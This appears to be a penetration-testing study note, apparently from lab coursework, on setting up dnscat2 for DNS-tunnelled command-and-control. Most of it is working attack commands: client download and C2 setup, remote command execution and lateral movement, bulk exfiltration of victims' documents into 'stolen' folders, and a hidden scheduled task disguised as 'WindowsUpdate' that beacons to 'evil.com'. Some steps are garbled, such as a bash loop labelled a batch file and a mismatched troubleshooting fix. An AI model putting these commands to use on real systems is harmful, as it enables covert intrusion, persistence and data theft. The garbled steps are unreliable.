# 🛰️ Dnscat2 - DNS Tunneling & Command-and-Control

## 🔍 Introduction to Dnscat2
[!INFO] This guide covers dnscat2, a tool for establishing command-and-control (C2) communications over the Domain Name System (DNS). It provides detailed steps on configuring and using dnscat2 for various scenarios.

### 🌐 Overview
Dnscat2 is a powerful tool that enables bidirectional communication through DNS queries. This technique bypasses firewalls, monitors network traffic, exfiltrates data, and establishes persistence by leveraging legitimate DNS protocols.

## 🔑 Setting Up Dnscat2

### 💻 Installation & Configuration on Kali Linux
```bash
sudo apt install dnscat2  # Install from package manager
```

### 🖥️ Installing dnscat2-powershell on Windows
```powershell
Invoke-WebRequest -Uri https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1 -OutFile C:\temp\dnscat2.ps1
```

### 🔑 Configuring dnscat2 Server & Client
#### 🏃 Running the DNS Listener (Server)
```bash
sudo ruby /usr/bin/dnscat2.rb --dns host=0.0.0.0,port=53,domain=htblabs.local,secret=mysecret123
```

#### ⌨️ Starting the Client in PowerShell
```powershell
Import-Module C:\temp\dnscat2.ps1; Start-Dnscat2 -DNSserver 192.168.1.100 -Domain htblabs.local -PreSharedSecret mysecret123
```

## 🌐 Establishing a DNS Tunnel

### 🔍 Connecting to the dnscat2 Server
```bash
# On Windows:
Start-Dnscat2 -DNSserver 192.168.1.100 -Domain htblabs.local -PreSharedSecret mysecret123

# On Kali:
ruby /usr/bin/dnscat2.rb --client domain=htblabs.local,dns=192.168.1.100,secret=mysecret123
```

### ⌚ Persistent Connection Setup (Client)
```powershell
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "WindowsUpdate" -Description "Reconnect to DNS tunnel"
```

## 🔍 C2 Communication Using Dnscat2

### 🤖 Interacting with the Victim Machine
- List available sessions: `sessions`
- Change session context: `session 1`, then run commands like `whoami` or `ipconfig`.
- Download files from victim: `download C:\Users\admin\sensitive.txt /tmp/sensitive/`

## 🔍 DNS Tunneling for Data Exfiltration

### 🚀 Exfiltrating Files Over DNS
```bash
# On the server:
download C:\Users\user\important.db /var/tmp/stolen/

# Using batch file on victim machine:
for file in C:\Users\*\Documents\*.xls; do download "$file" "/var/tmp/stolen/"; done
```

## 🚦 DNS Tunneling Detection Techniques

### 🔍 Analyzing DNS Queries
```bash
tcpdump -i any port 53 -A
dig TXT evil.com

# High entropy queries:
grep -P "\.TXT\s+\d+\s+IN\s+TXT\s+\\" /var/log/dnsmasq.log
```

## 🛠️ Troubleshooting Dnscat2

### 💡 Common Issues & Solutions
#### 🔐 Server Won't Start
```bash
# Port 53 already in use:
sudo systemctl stop systemd-resolved
sudo dnscat2-server --dns host=10.10.14.18,port=5353,domain=htblabs.local

# Compilation errors (ARM systems):
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser
```

#### 🔐 Client Connection Issues
```powershell
Test-NetConnection 192.168.1.100 -Port 53
Import-Module C:\temp\dnscat2.ps1 -Force
```

## 🛠️ DNS Tunneling Tools Comparison

| **Tool** | **Language** | **Features** | **Stealth** | **Performance** |
|----------|--------------|--------------|-------------|-----------------|
| **[[Dnscat2]]** | Ruby/C | Full C2, encryption | High | Medium |
| **iodine** | C | IP over DNS | Medium | High |
| **dns2tcp** | C | TCP over DNS | Medium | High |
| **DNSStager** | PowerShell | Payload staging | High | Low |
| **[[Dnscat2-PowerShell]]** | PowerShell | Windows-friendly | High | Low |

## 🛠️ Integration with Other Techniques

### 🔍 Using Dnscat2 for Lateral Movement
```powershell
# Credential Harvesting:
exec (client) 1> reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities

# Remote Command Execution:
exec (client) 1> wmic /node:172.16.5.19 process call create "cmd.exe /c whoami"
```

### 🔍 Combining Dnscat2 with Data Exfiltration
```bash
download C:\Users\admin\Documents\sensitive.docx /tmp/exfiltrated/

# Batch file exfiltration:
for file in C:\Users\*\Documents\*.pdf; do download "$file" "/tmp/exfiltrated/"; done
```

### 🔍 Establishing Persistence with Dnscat2
```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command 'Import-Module C:\temp\dnscat2.ps1; Start-Dnscat2 -DNSserver 10.10.14.18 -Domain evil.com -PreSharedSecret secret123'"
$trigger = New-ScheduledTaskTrigger -Daily -At 9am
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "WindowsUpdate" -Description "Windows Update Task"
```

---

## 📚 References

- **HTB Academy**: Pivoting, Tunneling & Port Forwarding - Page 12
- **[[Dnscat2 GitHub]]**: [Official Repository](https://github.com/iagox86/dnscat2)
- **[[Dnscat2-PowerShell]]**: [PowerShell Client](https://github.com/lukebaggett/dnscat2-powershell)
- **DNS Protocol**: [RFC 1035 - Domain Names](https://tools.ietf.org/html/rfc1035)
- **DNS Security**: [SANS DNS Security](https://www.sans.org/blog/dns-security-threats/)